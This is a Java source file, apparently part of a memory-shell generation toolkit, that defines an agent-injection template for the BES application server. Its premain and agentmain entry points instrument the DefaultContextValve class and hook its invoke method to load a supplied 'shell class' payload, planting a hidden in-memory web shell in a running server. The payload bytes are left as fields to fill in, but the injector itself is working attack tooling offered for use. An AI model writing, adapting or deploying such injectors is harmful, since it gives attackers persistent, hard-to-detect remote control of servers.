package org.leo.jmg.mem.injectortpl.bes;

import org.leo.jmg.mem.agent.AgentInjectorSupport;

import java.lang.instrument.Instrumentation;

/** invoke Agent 挂载模板。 */
public class BesContextValveAgentInjector extends AgentInjectorSupport {
    private static String shellClassName;
    private static String shellClass;
    private static final String[] TARGET_CLASSES = new String[]{
            "com/bes/enterprise/webtier/core/DefaultContextValve"
    };

    public static void premain(String arguments, Instrumentation instrumentation) throws Exception {
        launch(instrumentation, new BesContextValveAgentInjector());
    }

    public static void agentmain(String arguments, Instrumentation instrumentation) throws Exception {
        launch(instrumentation, new BesContextValveAgentInjector());
    }

    @Override
    protected String[] targetClasses() { return TARGET_CLASSES; }

    @Override
    protected String targetMethodName() { return "invoke"; }

    @Override
    protected String shellClassName() { return shellClassName; }

    @Override
    protected String shellClassPayload() { return shellClass; }
}
